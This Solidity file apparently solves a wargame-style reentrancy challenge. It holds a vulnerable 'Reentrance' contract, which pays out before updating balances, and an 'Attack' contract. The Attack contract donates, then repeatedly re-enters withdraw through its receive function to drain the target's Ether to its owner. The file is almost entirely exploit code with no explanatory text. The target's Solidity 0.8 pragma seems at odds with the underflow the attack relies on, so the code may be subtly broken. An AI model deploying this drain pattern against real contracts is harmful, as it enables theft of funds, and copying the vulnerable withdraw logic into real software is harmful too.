// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./Reentrance.sol";

contract Attack {
    Reentrance public reentrances;
    address public owner;

    constructor(address a) public {
        reentrances = Reentrance(payable(a));
        owner = msg.sender;
    }

    function attack() public payable {
        reentrances.donate{value: msg.value}(address(this));
        reentrances.withdraw(999999999999000);
    }

    function withdrawToEOA() public {
        require(msg.sender == owner);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        if (address(reentrances).balance >= 999999999999000) {
            reentrances.withdraw(999999999999000);
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}